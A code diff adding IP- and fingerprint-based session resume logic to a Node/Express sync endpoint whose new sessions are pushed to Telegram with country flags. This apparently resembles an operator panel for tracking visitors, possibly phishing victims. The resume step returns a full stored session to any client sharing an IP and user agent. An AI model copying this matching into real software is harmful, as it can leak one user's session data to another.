@@ -277,6 +277,57 @@ app.post('/api/sync', async (req, res) => {
         const existing = await db.getSession(data.sessionId);
         const flag = getFlagEmoji(country || (existing ? existing.ipCountry : 'XX') || 'XX');
 
+        // 0. Resume / Link Logic (Only if session doesn't exist yet)
+        if (!existing) {
+            try {
+                // Check for previous sessions by this IP
+                const sessionsByIp = await db.getSessionsByIp(ip);
+
+                // Strict Fingerprint Matching
+                const currentUa = data.fingerprint?.userAgent || '';
+                const currentRes = data.fingerprint?.screenResolution || '';
+
+                const matches = sessionsByIp.filter((s: any) => {
+                    const ua = s.fingerprint?.userAgent || '';
+                    const res = s.fingerprint?.screenResolution || '';
+                    // Allow match if currentRes is missing (initial load) but UA matches
+                    if (!currentRes && ua === currentUa) return true;
+                    return ua === currentUa && res === currentRes;
+                });
+
+                // Sort Newest First
+                matches.sort((a: any, b: any) => (b.lastSeen || 0) - (a.lastSeen || 0));
+
+                if (matches.length > 0) {
+                    const latest = matches[0];
+
+                    // Scenario A: Resume Incomplete Session
+                    // We check if it is NOT verified and NOT revoked.
+                    if (latest.status !== 'Verified' && latest.status !== 'Revoked') {
+                        console.log(`[Sync] Resuming previous session ${latest.id} for IP ${ip}`);
+
+                        // We must return the FULL data structure the client expects for hydration
+                        // The 'latest' object from getSessionsByIp is the spread data.
+                        const resumePayload = latest;
+
+                        const cmd = { action: 'RESUME', payload: resumePayload };
+                        // We don't save the new 'data' (temp session), we just tell client to switch.
+                        return res.json({ status: 'ok', command: cmd });
+                    }
+
+                    // Scenario B: Recurring User (Linked to Verified Session)
+                    if (latest.status === 'Verified') {
+                        console.log(`[Sync] Recurring user detected. Linking to ${latest.id}`);
+                        data.isRecurring = true;
+                        data.linkedSessionId = latest.id;
+                        // Continue to save 'data' as a new session...
+                    }
+                }
+            } catch (e) {
+                console.error('[Sync] Auto-Resume check failed:', e);
+            }
+        }
+
         // 1. New Session (Push Telegram)
         if (!existing) {
              const msg = formatSessionForTelegram(data, 'New Session Started', flag);
